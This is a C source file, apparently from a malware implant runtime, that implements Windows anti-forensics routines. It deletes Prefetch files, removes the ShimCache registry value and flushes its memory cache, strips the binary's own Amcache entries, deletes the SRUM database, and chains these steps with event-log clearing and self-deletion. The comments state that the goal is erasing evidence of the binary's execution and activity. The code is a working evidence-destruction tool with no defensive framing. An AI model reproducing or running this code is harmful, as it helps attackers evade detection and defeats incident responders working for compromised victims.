/*
 * Cleanup: Anti-Forensics — Prefetch, ShimCache, Amcache, SRUM
 *
 *   jocky_wipe_prefetch()    – delete all .pf files from the Prefetch folder
 *   jocky_patch_shimcache()  – delete AppCompatCache registry value + flush RAM cache
 *   jocky_patch_amcache()    – load Amcache.hve, delete entries for this binary, unload
 *   jocky_clear_srum()       – stop SRU service, delete SRUDB.dat
 *   jocky_cleanup_all()      – run all cleanup steps in the correct order
 *
 * Windows only.  All functions require Administrator-level privileges.
 * SeBackupPrivilege and SeRestorePrivilege are needed for hive loading.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>

/* ── Shared helpers ─────────────────────────────────────────────────── */

static bool enable_privilege(const wchar_t* name)
{
    HANDLE hTok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return false;

    LUID luid;
    bool ok = false;
    if (LookupPrivilegeValueW(NULL, name, &luid)) {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL) &&
             GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(hTok);
    return ok;
}

/* Delete all files matching a wildcard pattern (no recursion). */
static void wipe_glob(const wchar_t* pattern)
{
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    wchar_t dir[MAX_PATH];
    wcsncpy_s(dir, MAX_PATH, pattern, _TRUNCATE);
    wchar_t* sl = wcsrchr(dir, L'\\');
    if (!sl) { FindClose(h); return; }
    *(sl + 1) = L'\0';

    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        wchar_t full[MAX_PATH];
        _snwprintf_s(full, MAX_PATH, _TRUNCATE, L"%s%s", dir, fd.cFileName);
        SetFileAttributesW(full, FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(full);
    } while (FindNextFileW(h, &fd));

    FindClose(h);
}

/* ── Prefetch ───────────────────────────────────────────────────────── */

/*
 * Delete all .pf files from %SystemRoot%\Prefetch.
 * Prefetch records executable paths and load-time data; clearing them removes
 * evidence that a binary ran at all.
 */
bool jocky_wipe_prefetch(void)
{
    wchar_t sysroot[MAX_PATH];
    GetWindowsDirectoryW(sysroot, MAX_PATH);

    wchar_t pat[MAX_PATH];
    _snwprintf_s(pat, MAX_PATH, _TRUNCATE, L"%s\\Prefetch\\*.pf", sysroot);
    wipe_glob(pat);

    /* Also wipe the layout.ini which lists all known prefetch entries */
    wchar_t layout[MAX_PATH];
    _snwprintf_s(layout, MAX_PATH, _TRUNCATE, L"%s\\Prefetch\\Layout.ini", sysroot);
    SetFileAttributesW(layout, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(layout);

    return true;
}

/* ── ShimCache ──────────────────────────────────────────────────────── */

/*
 * Clear the Application Compatibility Cache (ShimCache).
 *
 * ShimCache records every PE that Windows processes via the Shim Engine
 * (nearly every executed binary).  Entries persist across reboots via a
 * binary blob in the registry.
 *
 * Two-step approach:
 *  1. Delete the registry value so nothing is written on next shutdown.
 *  2. Call BaseFlushAppcompatCache() (undocumented kernel32 export) to also
 *     evict the in-memory cache for the current session.
 *
 * Registry path:
 *   HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
 *   value: AppCompatCache (REG_BINARY)
 */
bool jocky_patch_shimcache(void)
{
    static const wchar_t* KEY =
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache";

    HKEY hk;
    bool deleted = false;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, KEY, 0,
                       KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        deleted = (RegDeleteValueW(hk, L"AppCompatCache") == ERROR_SUCCESS);
        RegCloseKey(hk);
    }

    /* Flush in-memory cache: undocumented but stable on Win7-Win11 */
    typedef BOOL (WINAPI* pfn_flush)(void);
    pfn_flush flush = (pfn_flush)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "BaseFlushAppcompatCache");
    if (flush) flush();

    return deleted;
}

/* ── Amcache ────────────────────────────────────────────────────────── */

/*
 * Load Amcache.hve as a temporary registry hive and delete any entry whose
 * LowerCaseLongPath (Win10+) or FullPath (Win8) matches this executable.
 *
 * Amcache records first-execution timestamps, file hashes, and paths.
 * Requires SeBackupPrivilege and SeRestorePrivilege to load the hive while
 * it is in use by the kernel.
 *
 * Registry paths searched:
 *   Root\InventoryApplicationFile\* → value LowerCaseLongPath   (Win10+)
 *   Root\File\*\*                   → value FullPath            (Win8)
 *
 * The hive is unmounted regardless of whether any entries were found.
 */

#define AMCACHE_HIVE    L"C:\\Windows\\AppCompat\\Programs\\Amcache.hve"
#define AMCACHE_TMPKEY  L"JockyAmcLoad"

/* Collect keys to delete (enumerate first, then delete to avoid index skew). */
typedef struct { wchar_t name[512]; } key_name_t;

static int collect_matching_keys(HKEY hParent, const wchar_t* value_name,
                                  const wchar_t* exe_lower,
                                  key_name_t* out, int cap)
{
    int n = 0;
    wchar_t subkey[512];
    DWORD idx = 0, subkey_len;

    while (n < cap) {
        subkey_len = 512;
        if (RegEnumKeyExW(hParent, idx++, subkey, &subkey_len,
                           NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

        HKEY hEntry;
        if (RegOpenKeyExW(hParent, subkey, 0, KEY_READ, &hEntry) != ERROR_SUCCESS)
            continue;

        wchar_t path_val[MAX_PATH * 2];
        DWORD path_len = sizeof(path_val);
        DWORD type;
        LONG r = RegQueryValueExW(hEntry, value_name, NULL, &type,
                                   (LPBYTE)path_val, &path_len);
        RegCloseKey(hEntry);

        if (r == ERROR_SUCCESS && type == REG_SZ) {
            /* Lowercase comparison */
            wchar_t pv_lower[MAX_PATH * 2];
            wcsncpy_s(pv_lower, MAX_PATH * 2, path_val, _TRUNCATE);
            CharLowerBuffW(pv_lower, (DWORD)wcslen(pv_lower));
            if (!wcscmp(pv_lower, exe_lower))
                wcsncpy_s(out[n++].name, 512, subkey, _TRUNCATE);
        }
    }
    return n;
}

bool jocky_patch_amcache(void)
{
    enable_privilege(SE_BACKUP_NAME);
    enable_privilege(SE_RESTORE_NAME);

    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, AMCACHE_TMPKEY, AMCACHE_HIVE)
            != ERROR_SUCCESS)
        return false;

    /* Get own executable path, lowercased */
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    CharLowerBuffW(exePath, (DWORD)wcslen(exePath));

    /* Replace forward slashes just in case */
    for (wchar_t* p = exePath; *p; p++) if (*p == L'/') *p = L'\\';

    bool found = false;

    /* ── Win10+: InventoryApplicationFile ── */
    HKEY hApps;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                       AMCACHE_TMPKEY L"\\Root\\InventoryApplicationFile",
                       0, KEY_READ | KEY_WRITE, &hApps) == ERROR_SUCCESS) {
        key_name_t keys[256];
        int n = collect_matching_keys(hApps, L"LowerCaseLongPath",
                                      exePath, keys, 256);
        for (int i = 0; i < n; i++) {
            RegDeleteKeyW(hApps, keys[i].name);
            found = true;
        }
        RegCloseKey(hApps);
    }

    /* ── Win8: Root\File\{VolumeGUID}\{SHA1} ── */
    HKEY hFile;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                       AMCACHE_TMPKEY L"\\Root\\File",
                       0, KEY_READ, &hFile) == ERROR_SUCCESS) {
        wchar_t vol[256];
        DWORD vol_len, vidx = 0;

        while (vol_len = 256,
               RegEnumKeyExW(hFile, vidx++, vol, &vol_len,
                              NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY hVol;
            if (RegOpenKeyExW(hFile, vol, 0,
                               KEY_READ | KEY_WRITE, &hVol) != ERROR_SUCCESS)
                continue;

            key_name_t keys[256];
            int n = collect_matching_keys(hVol, L"FullPath",
                                          exePath, keys, 256);
            for (int i = 0; i < n; i++) {
                RegDeleteKeyW(hVol, keys[i].name);
                found = true;
            }
            RegCloseKey(hVol);
        }
        RegCloseKey(hFile);
    }

    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, AMCACHE_TMPKEY);
    return found;
}

/* ── SRUM ───────────────────────────────────────────────────────────── */

/*
 * Clear the System Resource Usage Monitor (SRUM) database.
 *
 * SRUM tracks per-process network usage, CPU time, and energy consumption
 * for the past 30–60 days — a forensic goldmine.  The database is an ESE/JET
 * file at C:\Windows\System32\sru\SRUDB.dat.
 *
 * Approach:
 *  1. Stop the svsvc service (SRUM host) to release the file lock.
 *  2. Delete SRUDB.dat so Windows recreates an empty one on next boot.
 *  3. If immediate deletion fails (service wouldn't stop), schedule deletion
 *     with MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT).
 *  4. Restart the service so the system stays functional.
 */
bool jocky_clear_srum(void)
{
    static const wchar_t* SRUM_PATH =
        L"C:\\Windows\\System32\\sru\\SRUDB.dat";
    static const char* SRUM_SVC = "svsvc";

    /* Try to stop the SRUM service */
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    SC_HANDLE hSvc = NULL;
    bool was_running = false;

    if (hSCM) {
        hSvc = OpenServiceA(hSCM, SRUM_SVC,
                             SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_START);
        if (hSvc) {
            SERVICE_STATUS ss;
            if (QueryServiceStatus(hSvc, &ss) &&
                ss.dwCurrentState == SERVICE_RUNNING) {
                was_running = true;
                ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
                /* Brief spin-wait (max 3 s) for the service to stop */
                for (int i = 0; i < 30; i++) {
                    Sleep(100);
                    if (QueryServiceStatus(hSvc, &ss) &&
                        ss.dwCurrentState == SERVICE_STOPPED) break;
                }
            }
        }
    }

    /* Delete the database */
    SetFileAttributesW(SRUM_PATH, FILE_ATTRIBUTE_NORMAL);
    bool deleted = DeleteFileW(SRUM_PATH) != FALSE;

    if (!deleted) {
        /* Schedule deletion on next reboot as fallback */
        MoveFileExW(SRUM_PATH, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    }

    /* Restart the service so the system remains stable */
    if (hSvc && was_running) {
        StartServiceA(hSvc, 0, NULL);
    }

    if (hSvc)  CloseServiceHandle(hSvc);
    if (hSCM)  CloseServiceHandle(hSCM);

    return deleted;
}

/* ── Cleanup orchestrator ───────────────────────────────────────────── */

/*
 * Run all cleanup steps in the correct order:
 *
 *  1. Clear all event logs first (removes evidence of our own activity)
 *  2. Wipe Prefetch  (removes evidence of execution)
 *  3. Patch ShimCache (removes entry from compatibility cache)
 *  4. Patch Amcache   (removes first-execution hash record)
 *  5. Clear SRUM      (removes resource-usage history)
 *  6. Wipe artifacts  (temp, recent-files)
 *  7. Self-delete     (remove the binary last, while still running)
 *
 * Returns true if all steps returned true.  Individual failures are
 * non-fatal; the function continues and cleans up as much as possible.
 */
bool jocky_cleanup_all(void)
{
    bool ok = true;
    ok &= jocky_clear_logs();
    ok &= jocky_wipe_prefetch();
    ok &= jocky_patch_shimcache();
    ok &= jocky_patch_amcache();
    ok &= jocky_clear_srum();
    ok &= jocky_wipe_artifacts();
    ok &= jocky_self_delete();
    return ok;
}

#endif /* _WIN32 */
